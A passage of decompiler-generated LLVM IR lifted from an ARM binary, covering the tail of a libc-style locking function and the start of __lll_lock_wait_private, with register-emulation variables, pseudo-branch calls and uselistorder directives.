  %v3_13c38 = icmp uge i32 %v2_13c34, %v1_13c38.pre
  store i1 %v3_13c38, i1* %cpsr_c.global-to-local, align 1
  %v9_13c38 = icmp eq i32 %v2_13c34, %v1_13c38.pre
  br i1 %v9_13c38, label %dec_label_pc_13c40, label %dec_label_pc_13c58

dec_label_pc_13c54:                               ; preds = %dec_label_pc_13c40
  %v0_13c54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13c54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13c58

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13c24, %dec_label_pc_13c40.dec_label_pc_13c34_crit_edge, %dec_label_pc_13c54
  %v0_13c58 = phi i32 [ %v0_13c54, %dec_label_pc_13c54 ], [ %v2_13c34120, %dec_label_pc_13c24 ], [ %v2_13c34, %dec_label_pc_13c40.dec_label_pc_13c34_crit_edge ]
  %v1_13c58 = phi i32 [ %v0_13c54, %dec_label_pc_13c54 ], [ %v3_13c24, %dec_label_pc_13c24 ], [ %v1_13c38.pre, %dec_label_pc_13c40.dec_label_pc_13c34_crit_edge ]
  %v3_13c58 = icmp uge i32 %v0_13c58, %v1_13c58
  store i1 %v3_13c58, i1* %cpsr_c.global-to-local, align 1
  %v9_13c58 = icmp eq i32 %v0_13c58, %v1_13c58
  store i32 %v2_13c00, i32* %r4.global-to-local, align 4
  br i1 %v9_13c58, label %dec_label_pc_13bf0, label %dec_label_pc_13c58.dec_label_pc_13c24_crit_edge

dec_label_pc_13c58.dec_label_pc_13c24_crit_edge:  ; preds = %dec_label_pc_13c58
  %v0_13c24.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_13c28.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c24

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c68.backedge, %entry
  %v0_13c7c31 = phi i32 [ ptrtoint (i32* @global_var_219f0.357 to i32), %entry ], [ %v0_13c68, %dec_label_pc_13c68.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c78.loopexit:                      ; preds = %bb72
  store i32 %v2_13c00, i32* %r6.global-to-local, align 4
  %v0_13c7c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c78:                               ; preds = %dec_label_pc_13c78.loopexit, %dec_label_pc_13c74
  %v0_13c7c = phi i32 [ %v0_13c7c.pre, %dec_label_pc_13c78.loopexit ], [ %v0_13c7c31, %dec_label_pc_13c74 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13c7c = add i32 %v0_13c7c, 152
  %v3_13c7c = inttoptr i32 %v2_13c7c to i32*
  %v4_13c7c = load i32, i32* %v3_13c7c, align 4
  store i32 %v4_13c7c, i32* %r7.global-to-local, align 4
  %v0_13c80 = call i32 @__aeabi_read_tp()
  store i32 %v0_13c80, i32* %r0.global-to-local, align 4
  %v1_13c84 = add i32 %v4_13c7c, 8
  %v2_13c84 = inttoptr i32 %v1_13c84 to i32*
  %v3_13c84 = load i32, i32* %v2_13c84, align 4
  store i32 %v3_13c84, i32* %r3.global-to-local, align 4
  %v1_13c88 = add i32 %v0_13c80, -1168
  store i32 %v1_13c88, i32* %r5.global-to-local, align 4
  %v3_13c8c = icmp uge i32 %v3_13c84, %v1_13c88
  store i1 %v3_13c8c, i1* %cpsr_c.global-to-local, align 1
  %v9_13c8c = icmp eq i32 %v3_13c84, %v1_13c88
  br i1 %v9_13c8c, label %dec_label_pc_13df4, label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c78
  store i32 %v4_13c7c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13ca0112 = inttoptr i32 %v4_13c7c to i32*
  %v2_13ca0113 = load i32, i32* %v1_13ca0112, align 4
  store i32 %v2_13ca0113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13ca4115 = icmp eq i32 %v2_13ca0113, 0
  br i1 %v9_13ca4115, label %dec_label_pc_13cac, label %dec_label_pc_13cc4

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge
  %v0_13cac116 = phi i32 [ %v1_13ca4.pre, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge ], [ 0, %dec_label_pc_13c94 ]
  store i32 %v0_13cac116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13cbc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13cbc, label %dec_label_pc_13cc0, label %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge

dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge:  ; preds = %dec_label_pc_13cac
  %v0_13ca0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13ca4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13ca0 = inttoptr i32 %v0_13ca0.pre to i32*
  %v2_13ca0 = load i32, i32* %v1_13ca0, align 4
  store i32 %v2_13ca0, i32* %r3.global-to-local, align 4
  %v3_13ca4 = icmp uge i32 %v2_13ca0, %v1_13ca4.pre
  store i1 %v3_13ca4, i1* %cpsr_c.global-to-local, align 1
  %v9_13ca4 = icmp eq i32 %v2_13ca0, %v1_13ca4.pre
  br i1 %v9_13ca4, label %dec_label_pc_13cac, label %dec_label_pc_13cc4

dec_label_pc_13cc0:                               ; preds = %dec_label_pc_13cac
  %v0_13cc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13cc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge, %dec_label_pc_13cc0
  %v0_13cc4 = phi i32 [ %v0_13cc0, %dec_label_pc_13cc0 ], [ %v2_13ca0113, %dec_label_pc_13c94 ], [ %v2_13ca0, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge ]
  %v1_13cc4 = phi i32 [ %v0_13cc0, %dec_label_pc_13cc0 ], [ 0, %dec_label_pc_13c94 ], [ %v1_13ca4.pre, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge ]
  %v3_13cc4 = icmp uge i32 %v0_13cc4, %v1_13cc4
  store i1 %v3_13cc4, i1* %cpsr_c.global-to-local, align 1
  %v9_13cc4 = icmp eq i32 %v0_13cc4, %v1_13cc4
  br i1 %v9_13cc4, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_13cc4
  %v1_13cc8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13cc8, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_13cc4, %bb73
  %v1_13ccc = xor i1 %v9_13cc4, true
  call void @__pseudo_cond_branch(i1 %v1_13ccc, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_13cd0 = load i32, i32* %r5.global-to-local, align 4
  %v1_13cd0 = load i32, i32* %r7.global-to-local, align 4
  %v2_13cd0 = add i32 %v1_13cd0, 8
  %v3_13cd0 = inttoptr i32 %v2_13cd0 to i32*
  store i32 %v0_13cd0, i32* %v3_13cd0, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13df4:                               ; preds = %bb74, %dec_label_pc_13c78
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_13cd8 = load i32, i32* %r8.global-to-local, align 4
  %v2_13cd8 = add i32 %v0_13cd8, 152
  %v3_13cd8 = inttoptr i32 %v2_13cd8 to i32*
  %v4_13cd8 = load i32, i32* %v3_13cd8, align 4
  store i32 %v4_13cd8, i32* %r2.global-to-local, align 4
  %v1_13cdc = add i32 %v4_13cd8, 4
  %v2_13cdc = inttoptr i32 %v1_13cdc to i32*
  %v3_13cdc = load i32, i32* %v2_13cdc, align 4
  %v1_13ce0 = add i32 %v3_13cdc, 1
  store i32 %v1_13ce0, i32* %r3.global-to-local, align 4
  store i32 %v1_13ce0, i32* %v2_13cdc, align 4
  %v0_13ce8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ce8 = add i32 %v0_13ce8, 108
  %v2_13ce8 = inttoptr i32 %v1_13ce8 to i32*
  %v3_13ce8 = load i32, i32* %v2_13ce8, align 4
  store i32 %v3_13ce8, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_13cf0 = sub i32 0, %v3_13ce8
  store i32 %v1_13cf0, i32* %v2_13ce8, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_13d04 = load i32, i32* %r5.global-to-local, align 4
  %v1_13d04 = add i32 %v0_13d04, 104
  store i32 %v1_13d04, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_13df8.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13df8 = add i32 %v0_13d04, 108
  %v3_13df8 = inttoptr i32 %v2_13df8 to i32*
  store i32 %v0_13df8.pre, i32* %v3_13df8, align 4
  %v0_13dfc = load i32, i32* %r8.global-to-local, align 4
  %v1_13dfc = load i32, i32* %r3.global-to-local, align 4
  %v2_13dfc = add i32 %v1_13dfc, %v0_13dfc
  %v3_13dfc = inttoptr i32 %v2_13dfc to i32*
  %v4_13dfc = load i32, i32* %v3_13dfc, align 4
  store i32 %v4_13dfc, i32* %r0.global-to-local, align 4
  %v1_13e00 = add i32 %v4_13dfc, 4
  %v2_13e00 = inttoptr i32 %v1_13e00 to i32*
  %v3_13e00 = load i32, i32* %v2_13e00, align 4
  %v1_13e04 = add i32 %v3_13e00, -1
  store i32 %v1_13e04, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13e08 = icmp eq i32 %v1_13e04, 0
  store i32 %v1_13e04, i32* %v2_13e00, align 4
  br i1 %v2_13e08, label %dec_label_pc_13e14, label %dec_label_pc_13f04thread-pre-split

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13df4
  %v0_13e14 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e14 = load i32, i32* %r0.global-to-local, align 4
  %v2_13e14 = add i32 %v1_13e14, 8
  %v3_13e14 = inttoptr i32 %v2_13e14 to i32*
  store i32 %v0_13e14, i32* %v3_13e14, align 4
  %v0_13e18 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13e18, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e4c.dec_label_pc_13e1c_crit_edge, %dec_label_pc_13e14
  %v0_13e1c = phi i32 [ %v0_13e1c.pre, %dec_label_pc_13e4c.dec_label_pc_13e1c_crit_edge ], [ %v0_13e18, %dec_label_pc_13e14 ]
  %v1_13e1c = inttoptr i32 %v0_13e1c to i32*
  %v2_13e1c = load i32, i32* %v1_13e1c, align 4
  store i32 %v2_13e1c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_13e1c, i32* %r2.global-to-local, align 4
  %v2_13e28100 = load i32, i32* %v1_13e1c, align 4
  store i32 %v2_13e28100, i32* %r3.global-to-local, align 4
  %v3_13e2c102 = icmp uge i32 %v2_13e28100, %v2_13e1c
  store i1 %v3_13e2c102, i1* %cpsr_c.global-to-local, align 1
  %v9_13e2c108 = icmp eq i32 %v2_13e28100, %v2_13e1c
  br i1 %v9_13e2c108, label %dec_label_pc_13e34, label %dec_label_pc_13e4c

dec_label_pc_13e34:                               ; preds = %dec_label_pc_13e1c, %dec_label_pc_13e34.dec_label_pc_13e28_crit_edge
  %v0_13e34109 = phi i32 [ %v1_13e2c.pre, %dec_label_pc_13e34.dec_label_pc_13e28_crit_edge ], [ %v2_13e1c, %dec_label_pc_13e1c ]
  store i32 %v0_13e34109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13e44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13e44, label %dec_label_pc_13e48, label %dec_label_pc_13e34.dec_label_pc_13e28_crit_edge

dec_label_pc_13e34.dec_label_pc_13e28_crit_edge:  ; preds = %dec_label_pc_13e34
  %v0_13e28.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13e2c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13e28 = inttoptr i32 %v0_13e28.pre to i32*
  %v2_13e28 = load i32, i32* %v1_13e28, align 4
  store i32 %v2_13e28, i32* %r3.global-to-local, align 4
  %v3_13e2c = icmp uge i32 %v2_13e28, %v1_13e2c.pre
  store i1 %v3_13e2c, i1* %cpsr_c.global-to-local, align 1
  %v9_13e2c = icmp eq i32 %v2_13e28, %v1_13e2c.pre
  br i1 %v9_13e2c, label %dec_label_pc_13e34, label %dec_label_pc_13e4c

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e34
  %v0_13e48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13e48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e1c, %dec_label_pc_13e34.dec_label_pc_13e28_crit_edge, %dec_label_pc_13e48
  %v0_13e54 = phi i32 [ %v0_13e48, %dec_label_pc_13e48 ], [ %v2_13e28100, %dec_label_pc_13e1c ], [ %v2_13e28, %dec_label_pc_13e34.dec_label_pc_13e28_crit_edge ]
  %v1_13e4c = phi i32 [ %v0_13e48, %dec_label_pc_13e48 ], [ %v2_13e1c, %dec_label_pc_13e1c ], [ %v1_13e2c.pre, %dec_label_pc_13e34.dec_label_pc_13e28_crit_edge ]
  %v3_13e4c = icmp uge i32 %v0_13e54, %v1_13e4c
  store i1 %v3_13e4c, i1* %cpsr_c.global-to-local, align 1
  %v9_13e4c = icmp eq i32 %v0_13e54, %v1_13e4c
  br i1 %v9_13e4c, label %dec_label_pc_13e54, label %dec_label_pc_13e4c.dec_label_pc_13e1c_crit_edge

dec_label_pc_13e4c.dec_label_pc_13e1c_crit_edge:  ; preds = %dec_label_pc_13e4c
  %v0_13e1c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e4c
  %v2_13e54 = icmp ne i32 %v1_13e4c, 0
  store i1 %v2_13e54, i1* %cpsr_c.global-to-local, align 1
  %v7_13e58 = icmp slt i32 %v1_13e4c, 2
  br i1 %v7_13e58, label %dec_label_pc_13f04thread-pre-split, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e54
  %v0_13e5c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13e5c, i32* %r0.global-to-local, align 4
  %v0_13e60 = load i32, i32* @r1, align 4
  %v1_13e60 = add i32 %v0_13e60, 129
  store i32 %v1_13e60, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13f04thread-pre-split

dec_label_pc_13e78:                               ; preds = %dec_label_pc_13f04thread-pre-split, %dec_label_pc_13f00
  %v0_13e78 = phi i32 [ %v3_13f00, %dec_label_pc_13f00 ], [ %v0_13f04.pr, %dec_label_pc_13f04thread-pre-split ]
  %v1_13e78 = inttoptr i32 %v0_13e78 to i32*
  %v2_13e78 = load i32, i32* %v1_13e78, align 4
  store i32 %v2_13e78, i32* %r3.global-to-local, align 4
  %v1_13e7c = add i32 %v2_13e78, 8
  %v2_13e7c = inttoptr i32 %v1_13e7c to i32*
  %v3_13e7c = load i32, i32* %v2_13e7c, align 4
  store i32 %v3_13e7c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13e80 = icmp eq i32 %v3_13e7c, 0
  br i1 %v2_13e80, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_13e78
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_13e78, %bb75
  %v2_13e88 = xor i1 %v2_13e80, true
  call void @__pseudo_cond_branch(i1 %v2_13e88, i32 %v3_13e7c)
  %v0_13e8c = load i32, i32* %r6.global-to-local, align 4
  %v1_13e8c = inttoptr i32 %v0_13e8c to i32*
  %v2_13e8c = load i32, i32* %v1_13e8c, align 4
  store i32 %v2_13e8c, i32* %r5.global-to-local, align 4
  %v1_13e90 = add i32 %v2_13e8c, 20
  store i32 %v1_13e90, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e94

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13ec8.dec_label_pc_13e94_crit_edge, %bb76
  %v0_13e98 = phi i32 [ %v0_13e98.pre, %dec_label_pc_13ec8.dec_label_pc_13e94_crit_edge ], [ %v1_13e90, %bb76 ]
  %v0_13e94 = phi i32 [ %v0_13e94.pre, %dec_label_pc_13ec8.dec_label_pc_13e94_crit_edge ], [ %v2_13e8c, %bb76 ]
  %v1_13e94 = add i32 %v0_13e94, 20
  %v2_13e94 = inttoptr i32 %v1_13e94 to i32*
  %v3_13e94 = load i32, i32* %v2_13e94, align 4
  store i32 %v0_13e98, i32* %r2.global-to-local, align 4
  store i32 %v3_13e94, i32* %r4.global-to-local, align 4
  %v1_13ea0 = add i32 %v3_13e94, -1
  store i32 %v1_13ea0, i32* @r1, align 4
  %v1_13ea487 = inttoptr i32 %v0_13e98 to i32*
  %v2_13ea488 = load i32, i32* %v1_13ea487, align 4
  store i32 %v2_13ea488, i32* %r3.global-to-local, align 4
  %v3_13ea890 = icmp uge i32 %v2_13ea488, %v3_13e94
  store i1 %v3_13ea890, i1* %cpsr_c.global-to-local, align 1
  %v9_13ea896 = icmp eq i32 %v2_13ea488, %v3_13e94
  br i1 %v9_13ea896, label %dec_label_pc_13eb0, label %dec_label_pc_13ec8

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13e94, %dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge
  %v0_13eb097 = phi i32 [ %v1_13ea8.pre, %dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge ], [ %v3_13e94, %dec_label_pc_13e94 ]
  store i32 %v0_13eb097, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13ec0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13ec0, label %dec_label_pc_13ec4, label %dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge

dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge:  ; preds = %dec_label_pc_13eb0
  %v0_13ea4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13ea8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13ea4 = inttoptr i32 %v0_13ea4.pre to i32*
  %v2_13ea4 = load i32, i32* %v1_13ea4, align 4
  store i32 %v2_13ea4, i32* %r3.global-to-local, align 4
  %v3_13ea8 = icmp uge i32 %v2_13ea4, %v1_13ea8.pre
  store i1 %v3_13ea8, i1* %cpsr_c.global-to-local, align 1
  %v9_13ea8 = icmp eq i32 %v2_13ea4, %v1_13ea8.pre
  br i1 %v9_13ea8, label %dec_label_pc_13eb0, label %dec_label_pc_13ec8

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13eb0
  %v0_13ec4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13ec4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13ec8

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13e94, %dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge, %dec_label_pc_13ec4
  %v0_13ed4 = phi i32 [ %v0_13ec4, %dec_label_pc_13ec4 ], [ %v2_13ea488, %dec_label_pc_13e94 ], [ %v2_13ea4, %dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge ]
  %v1_13ec8 = phi i32 [ %v0_13ec4, %dec_label_pc_13ec4 ], [ %v3_13e94, %dec_label_pc_13e94 ], [ %v1_13ea8.pre, %dec_label_pc_13eb0.dec_label_pc_13ea4_crit_edge ]
  %v3_13ec8 = icmp uge i32 %v0_13ed4, %v1_13ec8
  store i1 %v3_13ec8, i1* %cpsr_c.global-to-local, align 1
  %v9_13ec8 = icmp eq i32 %v0_13ed4, %v1_13ec8
  store i32 %v0_13ed4, i32* %r2.global-to-local, align 4
  br i1 %v9_13ec8, label %dec_label_pc_13ed4, label %dec_label_pc_13ec8.dec_label_pc_13e94_crit_edge

dec_label_pc_13ec8.dec_label_pc_13e94_crit_edge:  ; preds = %dec_label_pc_13ec8
  %v0_13e94.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_13e98.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e94

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ec8
  %v2_13ed4 = icmp ne i32 %v1_13ec8, 0
  store i1 %v2_13ed4, i1* %cpsr_c.global-to-local, align 1
  %v7_13ed4 = icmp eq i32 %v1_13ec8, 1
  %v0_13edc = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_13ed4, label %dec_label_pc_13edc, label %dec_label_pc_13f00

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13ed4
  %v1_13edc = inttoptr i32 %v0_13edc to i32*
  %v2_13edc = load i32, i32* %v1_13edc, align 4
  store i32 %v2_13edc, i32* @r1, align 4
  %v1_13ee0 = add i32 %v2_13edc, 24
  %v2_13ee0 = inttoptr i32 %v1_13ee0 to i32*
  %v3_13ee0 = load i32, i32* %v2_13ee0, align 4
  store i32 %v3_13ee0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13ee4 = icmp eq i32 %v3_13ee0, 0
  br i1 %v2_13ee4, label %dec_label_pc_13f00, label %dec_label_pc_13eec

dec_label_pc_13eec:                               ; preds = %dec_label_pc_13edc
  %v1_13eec = add i32 %v2_13edc, 20
  %v2_13eec = inttoptr i32 %v1_13eec to i32*
  %v3_13eec = load i32, i32* %v2_13eec, align 4
  store i32 %v3_13eec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13f00

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13ed4, %dec_label_pc_13eec, %dec_label_pc_13edc
  %v1_13f00 = add i32 %v0_13edc, 4
  %v2_13f00 = inttoptr i32 %v1_13f00 to i32*
  %v3_13f00 = load i32, i32* %v2_13f00, align 4
  store i32 %v3_13f00, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f04 = icmp eq i32 %v3_13f00, 0
  br i1 %v2_13f04, label %dec_label_pc_13f0c, label %dec_label_pc_13e78

dec_label_pc_13f04thread-pre-split:               ; preds = %dec_label_pc_13e5c, %dec_label_pc_13e54, %dec_label_pc_13df4
  %v0_13f04.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13f0411 = icmp eq i32 %v0_13f04.pr, 0
  br i1 %v2_13f0411, label %dec_label_pc_13f0c, label %dec_label_pc_13e78

dec_label_pc_13f0c:                               ; preds = %dec_label_pc_13f00, %dec_label_pc_13f04thread-pre-split
  %v0_13f0c.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13f0c.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_13f0c.pre

; uselistorder directives
  uselistorder i32 %v0_13f04.pr, { 1, 0 }
  uselistorder i32 %v3_13f00, { 1, 2, 0 }
  uselistorder i32 %v1_13ec8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13ec4, { 1, 0, 2 }
  uselistorder i32 %v1_13ea8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13e48, { 1, 0, 2 }
  uselistorder i32 %v1_13e2c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13e1c, { 1, 0 }
  uselistorder i32 %v0_13cc0, { 1, 0, 2 }
  uselistorder i32 %v1_13ca4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_13c7c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13c54, { 1, 0, 2 }
  uselistorder i32 %v1_13c38.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_13c00, { 1, 0, 2 }
  uselistorder i32 %v0_13be0, { 1, 0, 2 }
  uselistorder i32 %v1_13bc4.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 5, 6, 8, 7, 2, 9, 10, 11, 12, 14, 13, 1, 15, 16, 17, 18, 19, 20, 21, 23, 22, 4, 24, 25, 26, 28, 27, 0, 29, 30, 32, 31, 3, 33 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 1, 22, 23, 25, 24, 0, 26, 27, 28, 30, 29, 4, 32, 31, 6 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13f0c, { 1, 0 }
  uselistorder label %dec_label_pc_13f00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13ec8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13eb0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_13e4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13e34, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_13cc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13cac, { 1, 0 }
  uselistorder label %dec_label_pc_13c58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c40, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_13be4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13bcc, { 1, 0 }
  uselistorder label %dec_label_pc_13c68.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13b98, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13f44 = load i32, i32* @r4, align 4
  store i32 %v3_13f44, i32* %stack_var_-16, align 4
  %v0_13f48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13f48, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13fcc.dec_label_pc_13f4c_crit_edge, %entry
  %v0_13f50 = phi i32 [ %v0_13f50.pre, %dec_label_pc_13fcc.dec_label_pc_13f4c_crit_edge ], [ %v0_13f48, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13f50, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_13f5817 = inttoptr i32 %v0_13f50 to i32*
  %v2_13f5818 = load i32, i32* %v1_13f5817, align 4
  %v3_13f5c20 = icmp ne i32 %v2_13f5818, 0
  store i1 %v3_13f5c20, i1* %cpsr_c.global-to-local, align 1
  %v9_13f5c26 = icmp eq i32 %v2_13f5818, 1
  br i1 %v9_13f5c26, label %dec_label_pc_13f64, label %dec_label_pc_13f7c

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f4c, %dec_label_pc_13f64.dec_label_pc_13f58_crit_edge
  %v0_13f6427 = phi i32 [ %v1_13f5c.pre, %dec_label_pc_13f64.dec_label_pc_13f58_crit_edge ], [ 1, %dec_label_pc_13f4c ]
  store i32 %v0_13f6427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13f74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13f74, label %dec_label_pc_13f78, label %dec_label_pc_13f64.dec_label_pc_13f58_crit_edge

dec_label_pc_13f64.dec_label_pc_13f58_crit_edge:  ; preds = %dec_label_pc_13f64
  %v0_13f58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13f5c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13f58 = inttoptr i32 %v0_13f58.pre to i32*
  %v2_13f58 = load i32, i32* %v1_13f58, align 4
  %v3_13f5c = icmp uge i32 %v2_13f58, %v1_13f5c.pre
  store i1 %v3_13f5c, i1* %cpsr_c.global-to-local, align 1
  %v9_13f5c = icmp eq i32 %v2_13f58, %v1_13f5c.pre
